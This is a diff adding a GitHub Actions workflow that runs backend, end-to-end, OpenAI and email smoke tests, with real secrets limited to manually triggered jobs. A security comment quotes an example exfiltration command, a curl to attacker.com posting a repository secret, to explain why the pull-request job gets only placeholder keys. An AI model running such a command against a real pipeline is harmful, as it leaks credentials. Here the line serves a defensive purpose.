@@ -1,0 +1,134 @@
+name: QA Tests (Phase 1-17)
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  backend:
+    name: Backend Integration + Unit Tests (Phases 1, 2, 6, 8, 9, 10, 11, 12, 15)
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Use Node.js 22
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: 'npm'
+
+      - name: Install dependencies (npm workspaces)
+        run: npm ci
+
+      - name: Run integration + unit suites
+        # SECURITY: do NOT pass real OPENAI_API_KEY / RESEND_API_KEY here.
+        # This job triggers on `pull_request`, so a malicious branch from a
+        # collaborator could modify the workflow to exfiltrate the secrets via
+        # `curl attacker.com -d "${{ secrets.X }}"`. Integration tests mock
+        # external services — placeholder values are sufficient.
+        # Real API calls are gated to the `workflow_dispatch`-only jobs below.
+        env:
+          NODE_ENV: test
+          EMAIL_TEST_MODE: 'true'
+          SKIP_RATE_LIMIT: 'true'
+          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
+          JWT_REFRESH_SECRET: ci-jwt-refresh-32-characters-minimum-12345
+          OPENAI_API_KEY: sk-ci-placeholder-not-real
+          RESEND_API_KEY: re_ci_placeholder_not_real
+        run: |
+          cd backend
+          NODE_ENV=test node --experimental-vm-modules ../node_modules/jest/bin/jest.js --runInBand --testPathPattern='integration/|unit/'
+
+  frontend-e2e:
+    name: Frontend Phase 14 E2E (mocked APIs)
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Use Node.js 22
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: 'npm'
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Install Playwright Chromium
+        run: npx playwright install --with-deps chromium
+
+      - name: Run Phase 14 E2E
+        run: |
+          cd frontend
+          npx playwright test -c playwright.phase-14.config.ts --reporter=list
+
+      - name: Upload Playwright trace on failure
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: playwright-trace
+          path: frontend/test-results-phase-14/
+          retention-days: 7
+
+  ai-embeddings:
+    name: AI / Embeddings Real OpenAI (Phase 13 — manual trigger)
+    runs-on: ubuntu-latest
+    if: github.event_name == 'workflow_dispatch'
+    timeout-minutes: 10
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Use Node.js 22
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: 'npm'
+
+      - run: npm ci
+
+      - name: Phase 13 OpenAI tests (~$0.05 per run)
+        env:
+          NODE_ENV: test
+          EMAIL_TEST_MODE: 'true'
+          SKIP_RATE_LIMIT: 'true'
+          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
+          JWT_REFRESH_SECRET: ci-jwt-refresh-32-characters-minimum-12345
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+        run: |
+          cd backend
+          NODE_ENV=test node --experimental-vm-modules ../node_modules/jest/bin/jest.js --runInBand --testPathPattern='phase-13/'
+
+  smoke:
+    name: Phase 0 Smoke (Resend live send — manual trigger)
+    runs-on: ubuntu-latest
+    if: github.event_name == 'workflow_dispatch'
+    timeout-minutes: 5
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Use Node.js 22
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: 'npm'
+
+      - run: npm ci
+
+      - name: Smoke (sends 1 real email to test inbox)
+        env:
+          NODE_ENV: test
+          EMAIL_TEST_MODE: 'true'
+          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
+          JWT_SECRET: ci-jwt-secret-32-characters-minimum-1234567890
+        run: |
+          cd backend
+          NODE_ENV=test node --experimental-vm-modules ../node_modules/jest/bin/jest.js --runInBand --testPathPattern='smoke/'
